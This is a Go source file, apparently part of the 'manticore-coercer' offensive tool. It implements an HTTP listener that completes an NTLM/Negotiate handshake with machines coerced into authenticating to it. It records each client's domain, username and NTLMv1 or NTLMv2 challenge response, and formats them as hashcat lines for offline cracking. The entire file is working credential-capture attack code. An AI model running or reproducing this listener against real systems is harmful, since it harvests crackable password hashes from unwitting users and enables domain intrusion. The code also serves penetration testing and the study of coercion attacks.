package listener

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/TheManticoreProject/Manticore/crypto/ntlmv1"
	"github.com/TheManticoreProject/Manticore/crypto/ntlmv2"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/authenticate"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/challenge"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/header"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/negotiate/flags"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/message/types"
	"github.com/TheManticoreProject/manticore-coercer/methods"
	"github.com/TheManticoreProject/manticore-coercer/results"
)

type HTTPListener struct {
	addr string
	srv  *http.Server
	ch   chan results.AuthResult

	mu         sync.Mutex
	challenges map[string][8]byte
}

func NewHTTPListener(listenAddr string, port int) *HTTPListener {
	l := &HTTPListener{
		addr:       fmt.Sprintf("%s:%d", listenAddr, port),
		ch:         make(chan results.AuthResult, 64),
		challenges: make(map[string][8]byte),
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/", l.handleNTLM)
	l.srv = &http.Server{
		Addr:    l.addr,
		Handler: mux,
	}
	return l
}

func (l *HTTPListener) Start() error {
	ln, err := net.Listen("tcp", l.addr)
	if err != nil {
		return err
	}
	go l.srv.Serve(ln)
	return nil
}

func (l *HTTPListener) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	err := l.srv.Shutdown(ctx)
	close(l.ch)
	return err
}

func (l *HTTPListener) Results() <-chan results.AuthResult {
	return l.ch
}

func (l *HTTPListener) handleNTLM(w http.ResponseWriter, r *http.Request) {
	authHeader := r.Header.Get("Authorization")
	if authHeader == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	var scheme string
	var blob []byte
	if len(authHeader) > 5 && authHeader[:5] == "NTLM " {
		scheme = "NTLM"
		var err error
		blob, err = base64.StdEncoding.DecodeString(authHeader[5:])
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
	} else if len(authHeader) > 10 && authHeader[:10] == "Negotiate " {
		scheme = "Negotiate"
		var err error
		blob, err = base64.StdEncoding.DecodeString(authHeader[10:])
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
	} else {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	if len(blob) < 12 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	msgType := types.MessageType(binary.LittleEndian.Uint32(blob[8:12]))

	switch msgType {
	case types.MESSAGE_TYPE_NEGOTIATE:
		l.handleNegotiate(w, r, scheme)
	case types.MESSAGE_TYPE_AUTHENTICATE:
		l.handleAuthenticate(w, r, blob)
	default:
		w.WriteHeader(http.StatusBadRequest)
	}
}

func (l *HTTPListener) handleNegotiate(w http.ResponseWriter, r *http.Request, scheme string) {
	var serverChallenge [8]byte
	rand.Read(serverChallenge[:])

	remoteIP, _, _ := net.SplitHostPort(r.RemoteAddr)
	l.mu.Lock()
	l.challenges[remoteIP] = serverChallenge
	l.mu.Unlock()

	challengeMsg := &challenge.ChallengeMessage{
		Header: header.Header{
			Signature:   header.NTLM_SIGNATURE,
			MessageType: types.MESSAGE_TYPE_CHALLENGE,
		},
		NegotiateFlags:  flags.NTLMSSP_NEGOTIATE_UNICODE | flags.NTLMSSP_REQUEST_TARGET | flags.NTLMSSP_NEGOTIATE_NTLM | flags.NTLMSSP_NEGOTIATE_128,
		ServerChallenge: serverChallenge,
	}

	challengeBytes, err := challengeMsg.Marshal()
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	w.Header().Set("WWW-Authenticate", scheme+" "+base64.StdEncoding.EncodeToString(challengeBytes))
	w.WriteHeader(http.StatusUnauthorized)
}

func (l *HTTPListener) handleAuthenticate(w http.ResponseWriter, r *http.Request, blob []byte) {
	var authMsg authenticate.AuthenticateMessage
	if _, err := authMsg.Unmarshal(blob); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	remoteIP, _, _ := net.SplitHostPort(r.RemoteAddr)
	l.mu.Lock()
	sc, ok := l.challenges[remoteIP]
	delete(l.challenges, remoteIP)
	l.mu.Unlock()
	if !ok {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	domain := decodeUTF16(authMsg.DomainName)
	username := decodeUTF16(authMsg.UserName)

	ntlmVersion := 1
	hashLine := ""
	hashMode := 0

	if len(authMsg.NtChallengeResponse) > 24 {
		ntlmVersion = 2
		var lm [24]byte
		copy(lm[:], authMsg.LmChallengeResponse)
		resp := ntlmv2.NewNTLMv2Response(username, domain, sc, lm, authMsg.NtChallengeResponse)
		if line, err := resp.HashcatString(); err == nil {
			hashLine = line
			hashMode = ntlmv2.HashcatMode
		}
	} else if len(authMsg.NtChallengeResponse) == 24 {
		var lm, nt [24]byte
		copy(lm[:], authMsg.LmChallengeResponse)
		copy(nt[:], authMsg.NtChallengeResponse)
		resp := ntlmv1.NewNTLMv1Response(username, domain, sc, lm, nt)
		if line, err := resp.HashcatString(); err == nil {
			hashLine = line
			hashMode = ntlmv1.HashcatMode
		}
	}

	ar := results.AuthResult{
		FromAddr:    r.RemoteAddr,
		Time:        time.Now(),
		AuthType:    methods.AuthHTTP,
		NTLMVersion: ntlmVersion,
		HashcatLine: hashLine,
		HashcatMode: hashMode,
		Domain:      domain,
		Username:    username,
	}

	select {
	case l.ch <- ar:
	default:
	}

	w.WriteHeader(http.StatusOK)
}

func decodeUTF16(b []byte) string {
	if len(b)%2 != 0 {
		return string(b)
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(binary.LittleEndian.Uint16(b[i*2:]))
	}
	return string(runes)
}
